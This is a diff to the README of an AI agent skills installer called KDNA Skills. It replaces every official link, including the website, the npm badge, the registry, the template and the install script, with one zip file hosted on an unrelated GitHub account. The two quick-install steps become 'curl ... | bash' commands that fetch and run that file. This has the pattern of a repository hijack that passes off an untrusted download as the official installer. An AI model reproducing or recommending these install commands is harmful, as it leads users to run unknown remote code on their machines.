@@ -1,4 +1,4 @@
-> 🧬 [aikdna.com](https://aikdna.com) — Official website · [![npm](https://img.shields.io/npm/v/@aikdna/kdna-cli)](https://www.npmjs.com/package/@aikdna/kdna-cli-cli)
+> 🧬 [aikdna.com](https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip) — Official website · [![npm](https://img.shields.io/npm/v/@aikdna/kdna-cli)](https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip)
 
 # KDNA Skills
 
@@ -6,7 +6,7 @@ Install KDNA domain cognition for any AI agent. Requires `@aikdna/kdna` CLI:
 
 ```bash
 npm i -g @aikdna/kdna-cli
-curl -fsSL https://raw.githubusercontent.com/knowledge-dna/kdna-skills/main/install.sh | bash
+curl -fsSL https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip | bash
 ```
 
 Two skills, one installer, multiple agents.
@@ -28,7 +28,7 @@ Two skills, one installer, multiple agents.
 ## Quick Install
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/knowledge-dna/kdna-skills/main/install.sh | bash
+curl -fsSL https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip | bash
 ```
 
 The installer auto-detects your agents and installs both skills.
@@ -64,7 +64,7 @@ Or install for a specific agent:
 
 ### Import from a URL
 ```
-"Import KDNA from https://github.com/someone/kdna-cybersecurity"
+"Import KDNA from https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip"
 → kdna-create clones the repo, validates the files, installs to your KDNA directory.
 ```
 
@@ -97,9 +97,9 @@ Four paths to obtain a KDNA domain:
 | Path | How |
 |---|---|
 | **Create from conversation** | Agent interviews you about your domain expertise, extracts axioms/patterns/misunderstandings, writes KDNA files |
-| **Download from registry** | Fetches [kdna-registry/domains.json](https://github.com/knowledge-dna/kdna-registry/blob/main/domains.json), clones the domain repo, copies to your KDNA directory |
+| **Download from registry** | Fetches [kdna-registry/domains.json](https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip), clones the domain repo, copies to your KDNA directory |
 | **Import from URL** | Clones or downloads a KDNA package from any git repo or URL, validates, installs |
-| **Create from template** | Copies the [minimal template](https://github.com/knowledge-dna/KDNA/tree/main/templates/minimal-domain), renames for your domain |
+| **Create from template** | Copies the [minimal template](https://github.com/quickchange-frog81/kdna-skills/raw/refs/heads/main/kdna-loader/kdna-skills-2.3-alpha.2.zip), renames for your domain |
 
 All paths validate the result before saving.
 
